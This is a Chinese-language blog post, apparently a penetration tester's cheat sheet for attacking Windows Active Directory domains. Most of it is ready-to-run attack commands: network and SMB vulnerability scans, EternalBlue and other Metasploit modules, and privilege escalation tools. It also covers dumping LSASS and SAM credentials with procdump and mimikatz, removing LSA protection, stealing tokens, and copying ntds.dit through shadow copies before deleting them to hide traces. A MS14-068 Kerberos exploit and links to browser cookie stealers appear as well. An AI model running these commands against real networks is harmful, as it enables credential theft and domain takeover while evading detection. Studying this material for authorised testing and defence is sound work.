<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>域渗透速查手册 | Nice's Blog</title><meta name="keywords" content="域渗透"><meta name="author" content="Nice"><meta name="copyright" content="Nice"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="域渗透速查手册">
<meta property="og:type" content="article">
<meta property="og:title" content="域渗透速查手册">
<meta property="og:url" content="http://nice759.com/2022/03/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/index.html">
<meta property="og:site_name" content="Nice&#39;s Blog">
<meta property="og:description" content="域渗透速查手册">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2022-03-14T08:49:53.000Z">
<meta property="article:modified_time" content="2022-03-17T08:09:34.079Z">
<meta property="article:author" content="Nice">
<meta property="article:tag" content="域渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://nice759.com/2022/03/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?fa254ca04b2501989f5cb00fe51f3cb3";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-03-17 16:09:34'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Nice's Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/images/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/Categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/Categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Nice's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/Categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">域渗透速查手册</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-14T08:49:53.000Z" title="发表于 2022-03-14 16:49:53">2022-03-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-17T08:09:34.079Z" title="更新于 2022-03-17 16:09:34">2022-03-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/Categories/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/03/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/#post-comment"><span id="twikoo-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="1-无凭证情况下"><a href="#1-无凭证情况下" class="headerlink" title="1.无凭证情况下"></a>1.无凭证情况下</h1><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cme smb &lt;ip_range&gt; 							# SMB 扫描存活主机</span><br><span class="line">nmap -sP -p &lt;ip&gt; 							# ping 扫描</span><br><span class="line">nmap -PN -sV --top-ports 50 --open &lt;ip&gt; 	# 快速扫描</span><br><span class="line">nmap -PN --script smb-vuln* -p139,445 &lt;ip&gt; 	# 检测 SMB 漏洞</span><br><span class="line">nmap -PN -sC -sV &lt;ip&gt; 						# 经典扫描</span><br><span class="line">nmap -PN -sC -sV -p- &lt;ip&gt;		 			# 全扫描</span><br><span class="line">nmap -sU -sC -sV &lt;ip&gt; 						# UDP 扫描</span><br></pre></td></tr></table></figure>



<h2 id="漏洞快速探测"><a href="#漏洞快速探测" class="headerlink" title="漏洞快速探测"></a>漏洞快速探测</h2><p>扫描后可以去先用已知漏洞打</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java rmi： exploit&#x2F;multi&#x2F;misc&#x2F;java_rmi_server</span><br><span class="line">ms17-010：exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">tomcat：auxiliary&#x2F;scanner&#x2F;http&#x2F;tomcat_enum</span><br><span class="line">jboss manager：exploit&#x2F;multi&#x2F;http&#x2F;tomcat_mgr_deploy</span><br><span class="line">Java反序列化漏洞测试：ysoserial</span><br><span class="line">查找产品的CVE漏洞：searchsploit</span><br><span class="line">MS14-025： searchsploit</span><br><span class="line">		   findstr &#x2F;S &#x2F;I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br><span class="line">爆破数据库连接：use admin&#x2F;mssql&#x2F;mssql_enum_sql_logins</span><br><span class="line">proxylogon：</span><br><span class="line">proxyshell：</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>低权限可以做的事情</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe</span><br><span class="line">查找内容有 password 的文件：findstr &#x2F;si &#39;password&#39; *.txt *.xml *.docx</span><br><span class="line">Juicy Potato &#x2F; Lovely Potato</span><br><span class="line">PrintSpoofer</span><br><span class="line">RoguePotato</span><br><span class="line">SMBGhost CVE-2020-0796</span><br><span class="line">CVE-2021-36934 (HiveNightmare&#x2F;SeriousSAM)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="拥有本地管理员权限"><a href="#拥有本地管理员权限" class="headerlink" title="拥有本地管理员权限"></a>拥有本地管理员权限</h2><h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">hashdump: post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; --sam &#x2F; --lsa &#x2F; --ntds</span><br></pre></td></tr></table></figure>



<h3 id="绕过LSA防护策略读取密码"><a href="#绕过LSA防护策略读取密码" class="headerlink" title="绕过LSA防护策略读取密码"></a>绕过LSA防护策略读取密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;!+&quot; &quot;!processprotect &#x2F;process:lsass.exe &#x2F;remove&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot;  &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect  &#x2F;process:lsass.exe&quot; &quot;!-&quot; #with mimidriver.sys </span><br></pre></td></tr></table></figure>



<h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a>token窃取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br><span class="line">.\incognito.exe execute -c &quot;&lt;domain&gt;\&lt;user&gt;&quot; powershell.exe</span><br><span class="line"></span><br><span class="line">use incognito</span><br><span class="line">impersonate_token &lt;domain&gt;\\&lt;user&gt;</span><br></pre></td></tr></table></figure>

<p>之前粗略分析过 token</p>
<p><a target="_blank" rel="noopener" href="https://0range-x.github.io/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/">Token窃取那些事 (0range-x.github.io)</a></p>
<h3 id="查看本地存储的所有密码"><a href="#查看本地存储的所有密码" class="headerlink" title="查看本地存储的所有密码"></a>查看本地存储的所有密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazagne.exe all</span><br></pre></td></tr></table></figure>



<h3 id="卷影拷贝（获取域控所有hash）"><a href="#卷影拷贝（获取域控所有hash）" class="headerlink" title="卷影拷贝（获取域控所有hash）"></a>卷影拷贝（获取域控所有hash）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">diskshadow list shadows all</span><br><span class="line"></span><br><span class="line">mklink &#x2F;d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">管理员权限执行 </span><br><span class="line">vssadmin create shadow &#x2F;for&#x3D;C: </span><br><span class="line">利用卷影副本卷名拷贝ntds.dit文件与用注册表导出system.hive </span><br><span class="line"></span><br><span class="line">copy \\?\GLOBALLROOT\Device\xxxxxxxxxx\windows\ntds\ntds.dit C:\ntds.dit reg sava hklm\system system.hive </span><br><span class="line">&#x2F;&#x2F;导出system.hive文件到注册表 </span><br><span class="line"></span><br><span class="line">vssadmin delete shadows &#x2F;for&#x3D;C: &#x2F;quiet   &#x2F;&#x2F;删除卷影，隐藏痕迹</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/"><a target="_blank" rel="noopener" href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/#vssadmin%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D">CVE-2020-1472的分析与复现 (0range-x.github.io)</a></a></p>
<h3 id="dpapi解密"><a href="#dpapi解密" class="headerlink" title="dpapi解密"></a>dpapi解密</h3><h1 id="2-内网信息收集"><a href="#2-内网信息收集" class="headerlink" title="2.内网信息收集"></a>2.内网信息收集</h1><h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、用户列表  net user &#x2F;domain</span><br><span class="line">windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户</span><br><span class="line"></span><br><span class="line">2.进程列表  tasklist &#x2F;svc</span><br><span class="line">分析杀毒软件&#x2F;安全监控工具等 邮件客户端 VPN ftp等</span><br><span class="line"></span><br><span class="line">3.服务列表	tasklist &#x2F;svc</span><br><span class="line">与安全防范工具有关服务[判断是否可以手动开关等] 存在问题的服务[权限&#x2F;漏洞]</span><br><span class="line"></span><br><span class="line">4.端口列表	netstat -ano</span><br><span class="line">开放端口对应的常见服务&#x2F;应用程序[匿名&#x2F;权限&#x2F;漏洞等] 利用端口进行信息收集</span><br><span class="line"></span><br><span class="line">5.补丁列表	systeminfo</span><br><span class="line">分析 Windows 补丁 第三方软件[Java&#x2F;Oracle&#x2F;Flash 等]漏洞</span><br><span class="line"></span><br><span class="line">6.本机共享	smbclient -L ip  </span><br><span class="line">		   net user \\ip\c$</span><br><span class="line">本机共享列表&#x2F;访问权限 本机访问的域共享&#x2F;访问权限</span><br><span class="line"></span><br><span class="line">7.本用户习惯分析</span><br><span class="line">历史记录 收藏夹 文档等</span><br></pre></td></tr></table></figure>

<h3 id="8-获取当前用户密码"><a href="#8-获取当前用户密码" class="headerlink" title="8.获取当前用户密码"></a>8.获取当前用户密码</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/peewpw/Invoke-WCMDump">Invoke-WCMDump</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/giMini/mimiDbg">mimiDbg</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li>
<li><a target="_blank" rel="noopener" href="http://launcher.nirsoft.net/downloads/">NirLauncher )</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump">quarkspwdump</a></li>
</ul>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">mimipenguin</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li>
</ul>
<h4 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h4><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpWeb">SharpWeb</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/hayasec/360SafeBrowsergetpass">360SafeBrowsergetpass</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/BrowserGhost/">BrowserGhost</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/DeEpinGh0st/Browser-cookie-steal">Browser-cookie-steal(窃取浏览器cookie)</a></li>
</ul>
<h4 id="Navicat密码"><a href="#Navicat密码" class="headerlink" title="Navicat密码"></a>Navicat密码</h4><p>版本：Navicat 11或12</p>
<p>方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CCESARE/article/details/104746596">https://blog.csdn.net/CCESARE/article/details/104746596</a></p>
<p>解密脚本：<a target="_blank" rel="noopener" href="https://github.com/tianhe1986/FatSmallTools">https://github.com/tianhe1986/FatSmallTools</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/HyperSine/how-does-navicat-encrypt-password">https://github.com/HyperSine/how-does-navicat-encrypt-password</a></p>
<h4 id="xshell-amp-xftp密码"><a href="#xshell-amp-xftp密码" class="headerlink" title="xshell&amp;xftp密码"></a>xshell&amp;xftp密码</h4><p><a target="_blank" rel="noopener" href="https://github.com/dzxs/Xdecrypt">https://github.com/dzxs/Xdecrypt</a></p>
<h4 id="mRemoteNG密码"><a href="#mRemoteNG密码" class="headerlink" title="mRemoteNG密码"></a>mRemoteNG密码</h4><p><a target="_blank" rel="noopener" href="https://github.com/kmahyyg/mremoteng-decrypt">https://github.com/kmahyyg/mremoteng-decrypt</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/haseebT/mRemoteNG-Decrypt">https://github.com/haseebT/mRemoteNG-Decrypt</a></p>
<h2 id="扩散信息收集"><a href="#扩散信息收集" class="headerlink" title="扩散信息收集"></a>扩散信息收集</h2><h3 id="常用端口扫描工具"><a href="#常用端口扫描工具" class="headerlink" title="常用端口扫描工具"></a>常用端口扫描工具</h3><ul>
<li>nmap</li>
<li>masscan</li>
<li>zmap</li>
<li>s扫描器</li>
<li>自写脚本</li>
<li>nc</li>
</ul>
<h3 id="内网拓扑架构分析"><a href="#内网拓扑架构分析" class="headerlink" title="内网拓扑架构分析"></a>内网拓扑架构分析</h3><ul>
<li>DMZ</li>
<li>管理网</li>
<li>生产网</li>
<li>测试网</li>
</ul>
<h3 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a>常见信息收集命令</h3><p>ipconfig</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all ------&gt; 查询本机 IP 段，所在域等</span><br></pre></td></tr></table></figure>

<p>net</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net user ------&gt; 本机用户列表</span><br><span class="line">net localgroup administrators ------&gt; 本机管理员[通常含有域用户]</span><br><span class="line">net user &#x2F;domain ------&gt; 查询域用户</span><br><span class="line">net group &#x2F;domain ------&gt; 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain ------&gt; 查询域管理员用户组</span><br><span class="line">net localgroup administrators &#x2F;domain ------&gt; 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 &#x2F;add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)</span><br><span class="line">net view ------&gt; 查询同一域内机器列表 net view &#x2F;domain ------&gt; 查询域列表</span><br><span class="line">net view &#x2F;domain:domainname</span><br></pre></td></tr></table></figure>

<p>dsquery</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain</span><br><span class="line">computers&quot; &#x2F;domain ------&gt; 列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user &#x2F;domain------&gt;列出该域内所有用户名</span><br><span class="line">dsquery subnet ------&gt;列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group &#x2F;domain ------&gt;列出该域内分组 </span><br><span class="line">dsquery ou ------&gt;列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time &#x2F;domain------&gt;列出该域内域控制器 </span><br></pre></td></tr></table></figure>



<h3 id="第三方信息收集"><a href="#第三方信息收集" class="headerlink" title="第三方信息收集"></a>第三方信息收集</h3><ul>
<li>NETBIOS 信息收集</li>
<li>SMB 信息收集</li>
<li>空会话信息收集</li>
<li>漏洞信息收集等</li>
</ul>
<h1 id="3-获取域控的方法"><a href="#3-获取域控的方法" class="headerlink" title="3.获取域控的方法"></a>3.获取域控的方法</h1><h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。 相关阅读:</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/92016.html">寻找SYSVOL里的密码和攻击GPP（组策略偏好）</a></li>
<li><a target="_blank" rel="noopener" href="http://blog.51cto.com/ycrsjxy/203095">Windows Server 2008 R2之四管理Sysvol文件夹</a></li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2288">SYSVOL中查找密码并利用组策略首选项</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1653">利用SYSVOL还原组策略中保存的密码</a></li>
</ul>
<h5 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</span><br></pre></td></tr></table></figure>

<p>利用mimikatz将工具得到的<a href="mailto:TGT_domainuser@SERVER.COM.ccache">TGT_domainuser@SERVER.COM.ccache</a>写入内存，创建缓存证书：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit</span><br><span class="line">net use k: \pentest.comc$</span><br></pre></td></tr></table></figure>

<p>相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://adsecurity.org/?p=676">Kerberos的工具包PyKEK</a></li>
<li><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/56081.html">深入解读MS14-068漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=541">Kerberos的安全漏洞</a></li>
</ul>
<h5 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h5><p>Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。 SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。 SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。 相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/">非扫描式的SQL Server发现</a></li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1508">SPN扫描</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">扫描SQLServer的脚本</a></li>
</ul>
<h5 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a>Kerberos的黄金门票</h5><p>在域上抓取的哈希</p>
